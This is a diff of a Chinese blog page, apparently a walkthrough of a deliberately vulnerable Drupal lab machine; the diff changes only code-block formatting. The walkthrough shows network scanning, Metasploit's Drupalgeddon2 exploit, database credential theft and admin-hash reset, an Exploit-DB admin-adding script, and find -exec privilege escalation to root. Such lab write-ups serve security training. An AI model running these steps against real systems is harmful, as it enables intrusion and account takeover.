@@ -249,19 +249,19 @@ document.addEventListener('pjax:error', (e) => {
 <p>&emsp;&emsp;注入原理：Drupal  Sql注入漏洞原理是酱紫的，Drupal在处理IN语句的时候，要通过expandArguments函数来展开数组。由于expandArguments函数没有对当前数组中key值进行有效的过滤，给攻击者可乘之机。攻击者通过精心构造的SQL语句可以执行任意PHP代码。</p>
 <h1 id="三、信息收集"><a href="#三、信息收集" class="headerlink" title="三、信息收集"></a>三、信息收集</h1><h2 id="1、探测主机IP"><a href="#1、探测主机IP" class="headerlink" title="1、探测主机IP"></a>1、探测主机IP</h2><p>&emsp;&emsp;可以使用以下两种方法：arp-scan和netdiscover</p>
 <h3 id="（1）arp-scan"><a href="#（1）arp-scan" class="headerlink" title="（1）arp-scan"></a>（1）arp-scan</h3><p>&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.1.108</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210214320940.png" alt="image-20211210214320940"></p>
 <h3 id="（2）netdiscover"><a href="#（2）netdiscover" class="headerlink" title="（2）netdiscover"></a>（2）netdiscover</h3><p>&emsp;&emsp;使用以下命令查看Kali本机IP为192.168.1.108</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210214552976.png" alt="image-20211210214552976"></p>
 <p>&emsp;&emsp;使用netdiscover命令 <code>netdiscover -r ip/子网掩码</code> 命令来探测靶机</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.1.1/24</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.1.1/24</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210214537191.png" alt="image-20211210214537191"></p>
 <h2 id="2、开放端口与服务扫描"><a href="#2、开放端口与服务扫描" class="headerlink" title="2、开放端口与服务扫描"></a>2、开放端口与服务扫描</h2><p>&emsp;&emsp;使用nmap对IP进行扫描：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.1.108</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.108</span><br></pre></td></tr></table></figure>
 
 <p>&emsp;&emsp;可以看到开放了HTTP和SSH</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210214433486.png" alt="image-20211210214433486"></p>
@@ -269,15 +269,15 @@ document.addEventListener('pjax:error', (e) => {
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210214617440.png" alt="image-20211210214617440"></p>
 <h1 id="四、漏洞探测与利用"><a href="#四、漏洞探测与利用" class="headerlink" title="四、漏洞探测与利用"></a>四、漏洞探测与利用</h1><h2 id="1、漏洞探测"><a href="#1、漏洞探测" class="headerlink" title="1、漏洞探测"></a>1、漏洞探测</h2><p>&emsp;&emsp;首先弱口令登录，扫端口、扫后台都没什么较大的收获。于是将目标盯在了Drupal这个cms框架上面了，发现这个cms有一个注入getshell的漏洞（CVE-2018-7600），并且metasploit中已有攻击模块，可以直接利用。</p>
 <p>&emsp;&emsp;打开msf，查找drupal武器库</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search drupal</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search drupal</span><br></pre></td></tr></table></figure>
 
 <p>&emsp;&emsp;这里可以根据需求选择，我选择比较新的2018年的攻击模块</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210215043543.png" alt="image-20211210215043543"></p>
-<h2 id="2、漏洞利用"><a href="#2、漏洞利用" class="headerlink" title="2、漏洞利用"></a>2、漏洞利用</h2><h3 id="（1）反弹shell"><a href="#（1）反弹shell" class="headerlink" title="（1）反弹shell"></a>（1）反弹shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use /exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.1.108</span><br></pre></td></tr></table></figure>
+<h2 id="2、漏洞利用"><a href="#2、漏洞利用" class="headerlink" title="2、漏洞利用"></a>2、漏洞利用</h2><h3 id="（1）反弹shell"><a href="#（1）反弹shell" class="headerlink" title="（1）反弹shell"></a>（1）反弹shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use /exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.1.108</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210215552055.png" alt="image-20211210215552055"></p>
 <p>&emsp;&emsp;使用python反弹一个交互式shell TTY，美化终端</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210215753754.png" alt="image-20211210215753754"></p>
 <h3 id="（2）flag1"><a href="#（2）flag1" class="headerlink" title="（2）flag1"></a>（2）flag1</h3><p>&emsp;&emsp;查看当前目录，看有无可以利用的信息文件，其他目录信息如下。发现了第一个flag1文件，查看flag1文件。</p>
@@ -291,17 +291,17 @@ document.addEventListener('pjax:error', (e) => {
 <li>drupal的配置文件是 <code>/sites/default/settings.php</code> ，是数据库连接配置文件。我们去查看这个文件有大收获，我们发现了flag2内容，以及数据库的账户和密码</li>
 </ol>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210221634133.png" alt="image-20211210221634133"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;drupaldb&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;dbuser&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;R0ck3t&#x27;</span>,</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;drupaldb&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;dbuser&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;R0ck3t&#x27;</span>,</span><br></pre></td></tr></table></figure>
 
 <h3 id="（4）数据库相关信息获取"><a href="#（4）数据库相关信息获取" class="headerlink" title="（4）数据库相关信息获取"></a>（4）数据库相关信息获取</h3><p>&emsp;&emsp;首先我们通过flag2得到了数据库为mysql数据库，并且数据库名、账号和密码都有了，肯定是要进入数据库看有无所需信息的。如系统管理员账户信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210222335371.png" alt="image-20211210222335371"></p>
 <p>&emsp;&emsp;Drupal框架默认的用户表就是users表，查询users表中，系统管理员admin的账户信息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use drupaldb</span><br><span class="line">show tables;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use drupaldb</span><br><span class="line">show tables;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210222519860.png" alt="image-20211210222519860"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR</span><br></pre></td></tr></table></figure>
 
 <p>&emsp;&emsp;发现admin账号和经过加密的密码，drupal常用密码加密是MD5格式，但是7.0以后因为安全性问题将加密方式改成了hash加密（由于很多在线MD5爆破和MD5数据库，可以查到很多MD5码的原文，所以Drupal 7已不再采用Drupal   6和5简单的MD5加密，而是采用一种新型的Hash加密方法。新型加密方法是“加了盐（Salt）”的MD5码，简单理解就是并不会直接将password进行MD5加密，而会和用户名或其它随机字符串组合在一起后再MD5加密。）。</p>
 <p>&emsp;&emsp;这里不是md5加密，应该是自定义的加密方式。flag2中给的提示暴力破解不是唯一的方法我们得想一下其他的办法。</p>
@@ -310,12 +310,12 @@ document.addEventListener('pjax:error', (e) => {
 <li>drupal7重置admin用户的密码</li>
 </ol>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210223623002.png" alt="image-20211210223623002"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure>
 
 <p>&emsp;&emsp;这样就能获取加密后的密码</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210225407251.png" alt="image-20211210225407251"></p>
 <p>&emsp;&emsp;进入数据库，修改admin的密码（密文）</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">-</span>udbuser <span class="operator">-</span>pR0ck3t</span><br><span class="line">use drupaldb;</span><br><span class="line">update users <span class="keyword">set</span> pass<span class="operator">=</span>&quot;$S$DFrLnFFXTGFCqK75zqX7nXsNI271QDS5pDN7uIOgcguQK81Fj1LI&quot; <span class="keyword">where</span> name<span class="operator">=</span>&quot;admin&quot;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>udbuser <span class="operator">-</span>pR0ck3t</span><br><span class="line">use drupaldb;</span><br><span class="line">update users <span class="keyword">set</span> pass<span class="operator">=</span>&quot;$S$DFrLnFFXTGFCqK75zqX7nXsNI271QDS5pDN7uIOgcguQK81Fj1LI&quot; <span class="keyword">where</span> name<span class="operator">=</span>&quot;admin&quot;;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210225458368.png" alt="image-20211210225458368"></p>
 <ol start="2">
@@ -328,47 +328,47 @@ document.addEventListener('pjax:error', (e) => {
 <ol>
 <li>查看Drupal版本，确定Drupal版本为7.24</li>
 </ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/includes/bootstrap.inc | grep VERSION</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /var/www/includes/bootstrap.inc | grep VERSION</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210225806246.png" alt="image-20211210225806246"></p>
 <ol start="2">
 <li>使用searchsploit查找可利用漏洞。选择添加管理员功能的攻击脚本适用于7.0-7.31范围（每个脚本括号后面有功能描述），符合7.24版本。</li>
 </ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit drupal</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit drupal</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210225927090.png" alt="image-20211210225927090"></p>
 <ol start="3">
 <li>利用drupal7.0版本漏洞增加有admin权限的用户</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.43.62 -u w01ke -p w01ke</span><br><span class="line">后面靶机出了点问题，靶机ip换成了192.168.43.62</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.43.62 -u w01ke -p w01ke</span><br><span class="line">后面靶机出了点问题，靶机ip换成了192.168.43.62</span><br></pre></td></tr></table></figure>
 
 <p>&emsp;&emsp;新增的管理员用户如下</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210230538034.png" alt="image-20211210230538034"></p>
 <p>&emsp;&emsp;使用新添加的用户w01ke登录网站，在content模块下找到flag3。</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210230701756.png" alt="image-20211210230701756"></p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210230747456.png" alt="image-20211210230747456"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Congratulations！</span><br><span class="line">Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.</span><br><span class="line"></span><br><span class="line">恭喜你!</span><br><span class="line">特殊的PERMS可以帮助找到密码-但您需要-exec该命令，以确定如何获取在shadow文件中的内容</span><br><span class="line"></span><br><span class="line">很明显的提示：find+perms+exec 命令用来提权</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Congratulations！</span><br><span class="line">Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.</span><br><span class="line"></span><br><span class="line">恭喜你!</span><br><span class="line">特殊的PERMS可以帮助找到密码-但您需要-exec该命令，以确定如何获取在shadow文件中的内容</span><br><span class="line"></span><br><span class="line">很明显的提示：find+perms+exec 命令用来提权</span><br></pre></td></tr></table></figure>
 
 <h1 id="五、提权"><a href="#五、提权" class="headerlink" title="五、提权"></a>五、提权</h1><p>&emsp;&emsp;根据flag3的提示提权，我们尝试查看用户列表信息（包含用户权限信息），这些用户信息一般存储在/etc/passwd目录下。</p>
 <p>&emsp;&emsp;查看用户列表，获取信息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210230913401.png" alt="image-20211210230913401"></p>
 <p>&emsp;&emsp;发现了flag4这个用户，并且得到了flag4的主目录为home目录。我们切换到home目录寻找flag4相关文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/flag4</span><br><span class="line">cat flag4.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/flag4</span><br><span class="line">cat flag4.txt</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210231011382.png" alt="image-20211210231011382"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag4提示内容:</span><br><span class="line">提示最后flag <span class="keyword">in</span> root下面。</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag4提示内容:</span><br><span class="line">提示最后flag <span class="keyword">in</span> root下面。</span><br></pre></td></tr></table></figure>
 
 <p>&emsp;&emsp;其实也可以直接用find命令查找flag4这个关键字，也能爆出flag4文件的路径。主要看个人思路</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890458865-543de0aa-dfe5-4431-b232-17b986961b35.png" alt="img"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;flag4</span></span><br><span class="line"><span class="string">cd /home/flag4</span></span><br><span class="line"><span class="string">cat flag4.txt</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name <span class="string">&quot;flag4</span></span><br><span class="line"><span class="string">cd /home/flag4</span></span><br><span class="line"><span class="string">cat flag4.txt</span></span><br></pre></td></tr></table></figure>
 
 <p>&emsp;&emsp;根据flag4的提示信息，最后一个flag存在于root目录下。我们可以使用find命令查找root目录下相关文件信息。</p>
 <ol>
 <li>使用find命令查看与/root目录有关的文件信息</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find /root</span><br><span class="line"></span><br><span class="line">find命令是用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件，并将查找到的子目录和文件全部进行显示。</span><br><span class="line"></span><br><span class="line">find(选项)(参数)</span><br><span class="line">-exec&lt;执行指令&gt;：假设find指令的回传值为True，就执行该指令</span><br><span class="line">-perm&lt;权限数值&gt;：查找符合指定的权限数值的文件或目录</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /root</span><br><span class="line"></span><br><span class="line">find命令是用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件，并将查找到的子目录和文件全部进行显示。</span><br><span class="line"></span><br><span class="line">find(选项)(参数)</span><br><span class="line">-exec&lt;执行指令&gt;：假设find指令的回传值为True，就执行该指令</span><br><span class="line">-perm&lt;权限数值&gt;：查找符合指定的权限数值的文件或目录</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210231236305.png" alt="image-20211210231236305"></p>
 <p>&emsp;&emsp;发现flag文件存在于/root目录下，尝试打开它，发现没有权限，所以必须要提权才能查看最终的flag文件</p>
@@ -376,7 +376,7 @@ document.addEventListener('pjax:error', (e) => {
 <ol start="2">
 <li>根据flag3中的提示，使用”-exec“提权,也就是find+perms+exec 命令来提权。这里有两种方法可以用，看个人想法。详细关于find提权会在另一篇文章中详解</li>
 </ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. find ./ acce -<span class="built_in">exec</span> <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br><span class="line"></span><br><span class="line">2. touch bcce</span><br><span class="line">find bcce -<span class="built_in">exec</span> <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. find ./ acce -<span class="built_in">exec</span> <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br><span class="line"></span><br><span class="line">2. touch bcce</span><br><span class="line">find bcce -<span class="built_in">exec</span> <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br></pre></td></tr></table></figure>
 
 <p>&emsp;&emsp;成功访问最后一个flag文件，游戏结束了。</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210231532987.png" alt="image-20211210231532987"></p>
